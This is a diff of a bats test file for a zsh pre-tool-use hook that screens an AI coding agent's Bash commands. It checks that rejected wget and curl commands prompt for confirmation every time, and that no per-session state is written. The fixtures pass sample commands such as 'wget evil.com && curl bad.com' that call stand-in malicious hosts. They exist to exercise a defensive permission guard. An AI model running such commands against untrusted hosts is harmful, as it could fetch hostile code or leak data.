@@ -4,6 +4,7 @@ setup() {
   bats_tmp_dir
   SCRIPT="$BATS_TEST_DIRNAME/../preToolUse-Bash"
   export CLAUDE_HOOKS_LOG_DIR="$BATS_TMP_DIR"
+  # Sandbox session dir so "writes no session state" can assert nothing lands there
   export CLAUDE_SESSIONS_DIR="$BATS_TMP_DIR"
 }
 
@@ -108,19 +109,6 @@ setup() {
   expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
 }
 
-@test "ask shows single rejected command" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
-    return 1
-  }
-  rtk-command-rewrite() { print -r -- "$1"; }
-  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
-}
-
 @test "no systemMessage when solkan rejects" {
   preToolUse-Bash-solkan() {
     print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
@@ -180,7 +168,7 @@ setup() {
   [[ "$(head -1 "$BATS_TMP_DIR/order.log")" = "SOLKAN" ]]
 }
 
-@test "first encounter: ask with reason" {
+@test "repeat reject in session: ask with reason every time" {
   preToolUse-Bash-solkan() {
     print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
     return 1
@@ -188,13 +176,31 @@ setup() {
   rtk-command-rewrite() { print -r -- "$1"; }
   bats_mock preToolUse-Bash-solkan rtk-command-rewrite
 
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  local input='{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  bats_run_zsh "$SCRIPT" <<<"$input"
+  bats_run_zsh "$SCRIPT" <<<"$input"
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'ask'
   expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
 }
 
-@test "repeat encounter: defer with no reason" {
+@test "repeat multi-reject in session: ask listing all rejected every time" {
+  preToolUse-Bash-solkan() {
+    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
+    return 1
+  }
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
+
+  local input='{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
+  bats_run_zsh "$SCRIPT" <<<"$input"
+  bats_run_zsh "$SCRIPT" <<<"$input"
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
+}
+
+@test "reject without session_id: ask with reason" {
   preToolUse-Bash-solkan() {
     print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
     return 1
@@ -202,44 +208,23 @@ setup() {
   rtk-command-rewrite() { print -r -- "$1"; }
   bats_mock preToolUse-Bash-solkan rtk-command-rewrite
 
-  mkdir -p "$BATS_TMP_DIR/test"
-  echo '{"preToolUse":{"Bash":{"askedCommands":["wget"]}}}' >"$BATS_TMP_DIR/test/state.json"
+  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget ❌'
+}
+
+@test "reject writes no session state" {
+  preToolUse-Bash-solkan() {
+    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget"]}}'
+    return 1
+  }
+  rtk-command-rewrite() { print -r -- "$1"; }
+  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'defer'
-  expect_json_null '.hookSpecificOutput.permissionDecisionReason'
-}
-
-@test "multi-reject all new: ask with all rejected in reason" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
-    return 1
-  }
-  rtk-command-rewrite() { print -r -- "$1"; }
-  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ wget, curl ❌'
-}
-
-@test "multi-reject all seen: defer with no reason" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
-    return 1
-  }
-  rtk-command-rewrite() { print -r -- "$1"; }
-  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
-
-  mkdir -p "$BATS_TMP_DIR/test"
-  echo '{"preToolUse":{"Bash":{"askedCommands":["wget","curl"]}}}' >"$BATS_TMP_DIR/test/state.json"
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'defer'
-  expect_json_null '.hookSpecificOutput.permissionDecisionReason'
+  [[ ! -e "$BATS_TMP_DIR/test/state.json" ]]
 }
 
 @test "prefixes command with CLAUDE_IS_SUBAGENT export when agent_id present" {
@@ -341,21 +326,4 @@ setup() {
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'allow'
   expect_json '.hookSpecificOutput.updatedInput.command' 'rtk rm-for-claude foo.txt'
-}
-
-@test "multi-reject mixed: ask with only new rejected in reason" {
-  preToolUse-Bash-solkan() {
-    print '{"allow":{"isAllowed":false,"allowed":[],"rejected":["wget","curl"]}}'
-    return 1
-  }
-  rtk-command-rewrite() { print -r -- "$1"; }
-  bats_mock preToolUse-Bash-solkan rtk-command-rewrite
-
-  mkdir -p "$BATS_TMP_DIR/test"
-  echo '{"preToolUse":{"Bash":{"askedCommands":["wget"]}}}' >"$BATS_TMP_DIR/test/state.json"
-
-  bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_name":"Bash","tool_input":{"command":"wget evil.com && curl bad.com"}}'
-  [[ "$status" -eq 0 ]]
-  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
-  expect_json '.hookSpecificOutput.permissionDecisionReason' '❌ curl ❌'
 }
